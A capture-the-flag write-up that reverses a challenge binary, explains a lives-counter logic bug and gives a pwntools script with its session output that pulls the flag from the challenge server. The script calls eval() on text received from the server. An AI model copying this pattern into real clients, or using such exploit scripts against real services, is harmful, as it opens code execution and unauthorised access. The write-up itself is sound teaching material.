# Pwn 200 - Math Homework

We are given a nc server, ```nc 40.76.33.15 55777```, and a 64 bit binary.

Here is the pseudocode:

```C
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  const char *v4; // rdi
  const char **v5; // [rsp+0h] [rbp-30h]
  char v6; // [rsp+1Fh] [rbp-11h]
  signed int i; // [rsp+20h] [rbp-10h]
  int v8; // [rsp+24h] [rbp-Ch]
  char *format; // [rsp+28h] [rbp-8h]

  v5 = argv;
  v6 = 0;
  v8 = 3;
  v3 = time(0LL);
  srand(v3);
  v4 = "I haven't done any homework all semester! Can you help with my math homework? I can only get three wrong...";
  puts("I haven't done any homework all semester! Can you help with my math homework? I can only get three wrong...");
  while ( 1 )
  {
    for ( i = 0; i <= 25; ++i )
    {
      format = (char *)generateExpression(v4);
      printf("%d. \n", (unsigned int)i, v5);
      printf(format);
      if ( (unsigned __int8)validateExpression(format) ^ 1 )
        printf("That was wrong! Lives left: %d", (unsigned int)--v8);
      else
        v6 = 1;
      checkState(v8, i == 25);
      putchar(10);
      v4 = format;
      free(format);
    }
    v4 = "If only there was a way I could get these homeworks to stop...";
    puts("If only there was a way I could get these homeworks to stop...");
    if ( v6 != 1 )
      end("If only there was a way I could get these homeworks to stop...");
    v6 = 0;
  }
}

signed __int64 __fastcall checkState(int a1, char a2)
{
  if ( a2 )
    return 2LL;
  if ( a1 )
    return 0LL;
  puts("\nArgh! I'm never going to finish at this rate!");
  exit(0);
  return 0LL;
}
```

First, we run the binary and see what it does:

```
alex@WINDOWS-0A3VRFK:/mnt/c/Users/alex/Desktop/CTF$ ./mathHomework
I haven't done any homework all semester! Can you help with my math homework? I can only get three wrong...
0.
8+0=8

1.
5+5=10

2.
5+1=
```

So it generates some math expressions and we have to provide the answer.

You can reverse this binary more, but I'll just skip to the vulnerability. The bug is in checkState. The program uses checkState in the following way:

The first argument is our lives, and the second argument is the question number, or loop counter. Essentially, checkState checks if we run out of lives or not, if we do, then the program exits.

However, if it's the last question, the checkState returns automatically without checking our lives. Basically what we can do with this is that if our lives decrement to 0 on the last question, then the program doesn't exit. Now, becuase checkState only checks if our lives is exactly 0, we can now decrement our lives to a negative number, which will pass the checkState lives check.

Now the flag is printed from the function end:

```C
void __noreturn end()
{
  puts("\nEh, I can just make it up on the final.");
  system("cat flag.txt");
  exit(0);
}
```

To reach end, all we have to do is not get a single question correct. Since our lives is not negative and it only decrements, we can just get all the questions wrong and receive the flag. My python program implementing this is shown below:

```python
from pwn import *

r = remote("40.76.33.15", 55777)
for i in range(23):
	r.recvuntil(str(i) + ".")
	r.recvline()
	tosolve = r.recvuntil("=").strip("=")
	ans = eval(tosolve)
	r.sendline(str(ans))

for i in range(29):
	r.sendline("9999")

r.interactive()
```

```
[x] Opening connection to 40.76.33.15 on port 55777
[x] Opening connection to 40.76.33.15 on port 55777: Trying 40.76.33.15
[+] Opening connection to 40.76.33.15 on port 55777: Done
[*] Switching to interactive mode

23. 
1*1=That was wrong! Lives left: 2
24. 
9|5=That was wrong! Lives left: 1
25. 
6+5=That was wrong! Lives left: 0
If only there was a way I could get these homeworks to stop...
0. 
7/9=That was wrong! Lives left: -1
1. 
5-4=That was wrong! Lives left: -2
2. 
5^8=That was wrong! Lives left: -3
3. 
7*9=That was wrong! Lives left: -4
4. 
9&6=That was wrong! Lives left: -5
5. 
0+1=That was wrong! Lives left: -6
6. 
0/1=That was wrong! Lives left: -7
7. 
8/5=That was wrong! Lives left: -8
8. 
2+2=That was wrong! Lives left: -9
9. 
7+1=That was wrong! Lives left: -10
10. 
4|2=That was wrong! Lives left: -11
11. 
5/6=That was wrong! Lives left: -12
12. 
1|4=That was wrong! Lives left: -13
13. 
9/1=That was wrong! Lives left: -14
14. 
0-5=That was wrong! Lives left: -15
15. 
9-0=That was wrong! Lives left: -16
16. 
0/3=That was wrong! Lives left: -17
17. 
3|6=That was wrong! Lives left: -18
18. 
8*1=That was wrong! Lives left: -19
19. 
3-2=That was wrong! Lives left: -20
20. 
6^0=That was wrong! Lives left: -21
21. 
8+6=That was wrong! Lives left: -22
22. 
5^9=That was wrong! Lives left: -23
23. 
9*9=That was wrong! Lives left: -24
24. 
3/1=That was wrong! Lives left: -25
25. 
8^3=That was wrong! Lives left: -26
If only there was a way I could get these homeworks to stop...

Eh, I can just make it up on the final.
b0ctf{stillbetterthanwebassign}
[*] Got EOF while reading in interactive
[*] Interrupted
[*] Closed connection to 40.76.33.15 port 55777
```

## Flag
### b0ctf{stillbetterthanwebassign}
